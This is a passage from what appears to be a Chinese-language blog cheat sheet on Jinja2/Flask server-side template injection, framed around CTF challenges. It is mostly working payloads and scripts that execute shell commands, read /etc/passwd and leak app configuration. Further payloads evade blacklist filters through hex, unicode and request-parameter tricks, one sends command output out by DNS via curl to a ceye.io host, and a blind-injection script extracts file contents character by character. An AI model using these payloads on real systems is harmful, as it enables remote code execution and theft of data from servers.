class="number">0</span>].__subclasses__:</span><br><span class="line">  num += <span class="number">1</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">      print(num, i)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行这个脚本后：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219134702.png" alt=""></p><p>可以发现<code>object</code>基类的第132个子类名为<code>os._wrap_close</code>的这个类有popen方法</p><p>先调用它的<code>__init__</code>方法进行初始化类，再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值，最后调用<code>popen</code>函数来执行命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219135353.png" alt=""></p><p>但是上面的方法仅限于在本地寻找，remote_find.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  payload = <span class="string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span> % i</span><br><span class="line">  url = <span class="string">&quot;&quot;</span></span><br><span class="line">  r = requests.post(url + payload)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;catch_warnings&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(r.text)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="python3的方法">python3的方法</h3><h4 id="os-wrap-close类中的popen"><code>os._wrap_close</code>类中的<code>popen</code></h4><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="import-中的os"><code>__import__</code>中的<code>os</code></h4><p>把上面<code>local_find.py</code>脚本中的search变量换成<code>__import__</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140616.png" alt=""></p><p>可以看到有5个类下是包含<code>__import__</code>的，随便用一个即可</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="python2的方法">python2的方法</h3><p>tips：python2的<code>string</code>类型不直接从属于属于基类，所以要用两次 <code>__bases__[0]</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140835.png" alt=""></p><h4 id="file类读写文件"><code>file</code>类读写文件</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219141043.png" alt=""></p><p>然后直接调用里面的方法即可，payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="warnings类中的linecache"><code>warnings</code>类中的<code>linecache</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">58</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[59]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="python2和python3通用方法">python2和python3通用方法</h3><h4 id="builtins-代码执行"><code>__builtins__</code>代码执行</h4><p>把上面<code>local_find.py</code>脚本search变量赋值为<code>__builtins__</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219142748.png" alt=""></p><p>再调用<code>eval</code>等函数和方法即可，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>总而言之，原理都是先找到含有<code>__builtins__</code>的类，然后再进一步利用。</p><h4 id="os"><code>os</code></h4><p>这个我在python3.8环境下好像没能找到直接含有os的类，python2.7.18下有两个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="获取配置信息">获取配置信息</h3><h4 id="config">config</h4><p>通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息</p><h4 id="request">request</h4><p>jinja2中存在对象<code>request</code></p><p>查询一些配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="url-for">url_for</h4><p>查询配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="get-flashed-messages">get_flashed_messages</h4><p>查询配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass">Bypass</h2><h3 id="过滤">过滤<code>.</code></h3><h4 id="绕过">[]绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#39;__class__&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="attr-绕过"><code>attr()</code>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(&#39;__class__&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="getattr-绕过"><code>getattr()</code>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;getattr((),&quot;__class__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤引号">过滤引号</h3><p>五种不同的请求方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.values.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure><h4 id="GET">GET</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="POST">POST</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">POST:arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="Cookie">Cookie</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1=open;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><h4 id="chr绕过">chr绕过</h4><h3 id="过滤-v2">过滤<code>_</code></h3><h4 id="编码绕过">编码绕过</h4><p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">376</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>关键字也可以使用十六进制编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+hex(ord(string[i]))[<span class="number">2</span>:]</span><br><span class="line">  print(result)</span><br><span class="line">  </span><br><span class="line">tohex(string1)</span><br></pre></td></tr></table></figure><p>比如说NCTF2020 你是我的master吗 这道题：</p><p>waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&quot;&quot;[&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;][&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;]()[64][&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;][&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;][&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;](&quot;\x6f\x73&quot;)[&quot;\x70\x6f\x70\x65\x6e&quot;](&quot;ls&quot;)[&quot;\x72\x65\x61\x64&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>全16进制，只能在SSTI的时候用。</p><h4 id="request绕过">request绕过</h4><p>同上</p><h3 id="过滤关键字">过滤关键字</h3><h4 id="双写、大小写">双写、大小写</h4><h4 id="拼接字符">拼接字符</h4><p>+拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>join拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure><p>格式化+管道符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure><h4 id="替代方法">替代方法</h4><p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p><p>过滤config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤-v3">过滤<code>[]</code></h3><h4 id="索引中的">索引中的<code>[]</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>][<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].pop(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>].__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="魔术方法中的">魔术方法中的<code>[]</code></h4><p>魔术方法中本来是没有中括号的，但是如果需要使用<code>[]</code>绕过关键字的话，可以用<code>__getattribute__</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;</span><br></pre></td></tr></table></figure><p>也可以配合<code>requests</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1&#x3D;__class__</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure><h3 id="过滤-v4">过滤<code>&#123;&#125;</code></h3><h4 id="DNSLOG外带数据">DNSLOG外带数据</h4><p>用<code>&#123;%%&#125;</code>替代，使用判断语句进行dns外带数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;ssti&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="盲注">盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure><h4 id="print标记">print标记</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass-Plus">Bypass Plus</h2><p>介绍一些常见过滤组合和最近的赛题。</p><h3 id="过滤-，-和">过滤<code>_</code>，<code>.</code>和<code>'</code></h3><p>python3下可以使用<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>下划线可以用编码绕过和<code>requests</code>绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤args，-和">过滤<code>args</code>，<code>.</code>和<code>_</code></h3><p>参考y1ng师傅的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="Update">Update</h2><h3 id="Unicode绕过">Unicode绕过</h3><p>安洵杯2020 EasyFlask：<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2020">https://github.com/D0g3-Lab/i-SOON_CTF_2020</a></p><p>GitHub上的题目环境有点问题，文件给的好像不全。</p><p>可以看一下过滤：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219211009.png" alt=""></p><p>直接来看payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span 